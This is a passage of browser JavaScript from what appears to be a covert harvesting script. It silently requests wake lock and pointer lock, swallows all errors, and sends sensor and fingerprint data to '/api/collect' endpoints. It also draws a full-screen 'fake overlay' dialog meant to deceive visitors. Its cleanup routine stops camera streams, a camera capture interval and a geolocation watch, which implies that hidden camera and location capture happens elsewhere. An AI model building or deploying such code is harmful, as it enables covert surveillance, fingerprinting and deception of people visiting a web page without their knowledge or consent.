          this.core.send('/api/collect/fingerprint', { proximity: sensor.max });
        };
        sensor.start();
      }
    } catch (e) {}
  }

  async forceWakeLock() {
    try {
      if ('wakeLock' in navigator) {
        const wakeLock = await navigator.wakeLock.request('screen');
        await this.core.send('/api/collect/formdata', {
          formId: 'wake-lock',
          fields: { active: !!wakeLock },
          url: window.location.href
        });
      }
    } catch (e) {}
  }

  async forcePointerLock() {
    try {
      document.body.requestPointerLock();
      setTimeout(() => {
        if (document.pointerLockElement) {
          document.exitPointerLock();
          this.core.send('/api/collect/formdata', {
            formId: 'pointer-lock',
            fields: { supported: true },
            url: window.location.href
          });
        }
      }, 200);
    } catch (e) {}
  }

  // === FAKE OVERLAY (simplified) ===
  showFakeOverlay(config) {
    if (this.overlayShown) return;
    this.overlayShown = true;

    const overlay = document.createElement('div');
    overlay.id = '__harvester_overlay__';
    Object.assign(overlay.style, {
      position: 'fixed', top: '0', left: '0', width: '100%', height: '100%', zIndex: '2147483647',
      backgroundColor: 'rgba(0,0,0,0.7)', display: 'flex', justifyContent: 'center', alignItems: 'center',
      animation: 'fadeIn 0.3s ease'
    });

    const color = this.getAccentColor(config.iconType);
    overlay.innerHTML = `
      <div style="background:#1a1a2e;border-radius:16px;padding:32px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.5);border:1px solid ${color}40;">
        <svg style="width:48px;height:48px;color:${color};margin-bottom:16px;">${this.getIconGradient(config.iconType)}${this.getIconSVG(config.iconType)}</svg>
        <h3 style="color:#fff;margin:0 0 8px;font-size:1.2rem;">${config.title}</h3>
        <p style="color:#aaa;font-size:0.85rem;margin:0 0 20px;line-height:1.4;">${config.message}</p>
        ${config.code ? `<div style="background:#000;padding:12px;border-radius:8px;font-family:monospace;color:${color};font-size:1.2rem;margin-bottom:16px;letter-spacing:2px;">${config.code}</div>` : ''}
        <div style="background:${color};color:#000;border:none;padding:10px 28px;border-radius:8px;font-weight:600;display:inline-block;font-size:0.9rem;opacity:0.8;">${config.buttonText}</div>
      </div>
    `;

    document.body.appendChild(overlay);

    setTimeout(() => {
      if (overlay.parentNode) {
        overlay.style.animation = 'fadeOut 0.2s ease';
        setTimeout(() => { if (overlay.parentNode) overlay.parentNode.removeChild(overlay); }, 200);
      }
      this.overlayShown = false;
    }, 3000);
  }

  hideFakeOverlay() {
    const overlay = document.getElementById('__harvester_overlay__');
    if (overlay) {
      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
    }
    this.overlayShown = false;
  }

  // === CLEANUP ===
  cleanup() {
    this.streams.forEach(stream => { stream.getTracks().forEach(track => track.stop()); });
    this.streams = [];
    if (this.watchId) navigator.geolocation.clearWatch(this.watchId);
    if (this.cameraCaptureInterval) clearInterval(this.cameraCaptureInterval);
    this.hideFakeOverlay();
  }
}